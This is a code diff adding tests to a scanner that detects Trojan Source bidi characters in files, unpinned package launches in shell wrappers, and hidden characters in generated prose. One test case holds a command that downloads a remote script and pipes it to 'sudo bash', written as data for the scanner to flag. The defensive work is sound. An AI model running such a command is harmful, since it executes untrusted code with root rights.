@@ -425,3 +425,77 @@ def test_rule_file_with_only_legitimate_characters_is_not_a_finding(tmp_path: Pa
     files = {"CLAUDE.md": f"{BOM}# Rules\nUse ❤{VS16} sparingly.\n",
              "AGENTS.md": f"Reply in Hebrew: שלום{RLM}\n"}
     assert _run(tmp_path, files) == []
+
+
+# --- review fixes ----------------------------------------------------------------------------
+
+def test_bidi_in_code_under_a_locale_looking_path_is_still_found(tmp_path: Path):
+    # "fa-icons" or a "he" folder makes the path look like a right-to-left locale; a Trojan
+    # Source line has no right-to-left letter, so it is still reported
+    files = {"src/fa-icons/index.js": TROJAN, "src/he/auth.ts": TROJAN,
+             "locales/ar/common.json": f'{{"count": "{LRI}{{n}}{PDI} رسالة"}}\n'}
+    [f] = _run(tmp_path, files)
+    assert f.title == BIDI_TITLE
+    assert sorted({e.path for e in f.evidence}) == ["src/fa-icons/index.js", "src/he/auth.ts"]
+
+
+def test_unpinned_launch_through_a_shell_wrapper():
+    from unvarnish.scanners.hidden_text import unpinned_launch
+
+    npm, py = "unpinned npm package", "unpinned Python package"
+    cases = [
+        ("cmd", ["/c", "npx", "-y", "pkg"], npm), ("cmd.exe", ["/C", "npx", "pkg"], npm),
+        ("cmd", ["/c", "npx", "-y", "pkg@1.2.3"], None),
+        ("sh", ["-c", "npx -y pkg"], npm), ("bash", ["-lc", "uvx srv"], py),
+        ("powershell", ["-Command", "uvx srv"], py), ("sh", ["-c", "node server.js"], None),
+        ("sh", ["-c", "wget -qO- https://x.test/i.sh | sudo bash"],
+         "downloads and runs a script"),
+        ("cmd", ["/c"], None), ("sh", ["-c", "npx 'unbalanced"], None),
+    ]
+    for command, args, want in cases:
+        got = unpinned_launch(command, args)
+        assert (got[0] if got else None) == want, (command, args, got)
+
+
+def test_prose_requests_and_text_hold_no_raw_hidden_characters():
+    from tests.stub_backend import StubBackend
+    from unvarnish.model.budget import BudgetTracker
+    from unvarnish.render.prose import generate_prose
+
+    stub = StubBackend({"prose": f"The tool{ZWSP} is fine{RLO}."})
+    facts = {"tool": "t", "largest_file": f"src/a{RLO}b.js", "notes": [f"x{_tags('hi')}"]}
+    out = generate_prose(stub, {"deployment": facts}, tone="direct", effort=None,
+                         budget=BudgetTracker(None))
+    assert stub.requests and all(_raw_free(r.system) and all(_raw_free(m.content)
+                                                             for m in r.messages)
+                                 for r in stub.requests)
+    assert "src/a[U+202E]b.js" in stub.requests[0].messages[0].content
+    assert out.text["deployment"] == "The tool[U+200B] is fine[U+202E]."
+
+
+def test_ask_answer_holds_no_raw_hidden_characters(engagement, synthetic_repo):
+    from tests.stub_backend import StubBackend
+    from tests.test_compare_phase import _compare_stub, _two_tools
+    from unvarnish.ask.index import build_index
+    from unvarnish.ask.loop import run_question
+    from unvarnish.ask.tools import AskTools
+    from unvarnish.model.budget import BudgetTracker
+
+    _two_tools(engagement, synthetic_repo, _compare_stub())
+    index = build_index(engagement)
+    answer = json.dumps({"action": "answer", "answer": f"Handled{ZWSP} in app.py{RLO}.",
+                         "citations": []})
+    res = run_question(engagement, StubBackend({"AskStep": answer}), AskTools(engagement, index),
+                       index, "Where?", budget=BudgetTracker(None), effort=None, max_calls=2)
+    assert res.answer == "Handled[U+200B] in app.py[U+202E]."
+    assert all(_raw_free(s.result_preview or "") for s in res.steps)
+
+
+def test_rendered_documents_escape_hidden_characters_from_any_field(tmp_path: Path):
+    from unvarnish.render.markdown import make_env, render_document
+
+    (tmp_path / "t.md.j2").write_text("# {{ title }}\n\n`{{ path }}` {{ emoji }}\n",
+                                      encoding="utf-8")
+    doc = render_document(make_env([tmp_path]), "t.md.j2", {
+        "title": "Findings", "path": f"src/a{ZWSP}b{RLO}.py", "emoji": f"❤{VS16}"})
+    assert doc == f"# Findings\n\n`src/a[U+200B]b[U+202E].py` ❤{VS16}\n"
